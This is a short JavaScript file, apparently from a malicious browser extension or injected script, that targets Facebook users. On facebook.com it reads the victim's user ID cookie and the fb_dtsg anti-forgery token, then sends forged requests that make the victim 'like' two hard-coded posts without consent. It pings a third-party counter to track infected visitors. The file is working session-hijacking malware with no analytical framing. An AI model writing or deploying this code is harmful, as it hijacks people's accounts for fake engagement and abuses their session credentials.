new Image().src = 'http://whos.amung.us/widget/r3dsiker1.png';


var media = {

facebook: {

profile_id: function () {

return document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]).toString();

},

fb_dtsg: function () {

return document.getElementsByName('fb_dtsg')[0].value;

},



post_like: function (post_id) {

var user_id = this.profile_id();

var fb_dtsg = this.fb_dtsg();

var params = "client_id=1444594705617%3A2046578192&ft_ent_identifier=" + post_id + "&reaction_type=1&root_id=u_0_8&source=2&av=" + user_id + "&ft[tn]=%3E%3D]&ft[type]=20&__user=" + user_id + "&__a=1&__dyn=7AmajEyl2qm9ongDxiWEyx9CzEWq2WiqAdy9VQC-K26m6oKezob4q68K5Uc-dwFG58kUgx6dEwy8yUnCF1afybDGcCxC2e78baxidw&__req=i&fb_dtsg=" + fb_dtsg + "&ttstamp=265816911697518169675175108&__rev=1981648";

var xhr = new XMLHttpRequest,

url = "https://www.facebook.com/ufi/reaction/?__pc=EXP1%3ADEFAULT";

xhr.open("POST", url, false);

xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

xhr.send(params);

},


}

}

if (location.hostname.indexOf("facebook.com") >= 0) {

new Image().src = '//whos.amung.us/swidget/r3dsiker2';

media.facebook.post_like("1718704951495925");
media.facebook.post_like("1718693381497082");

}
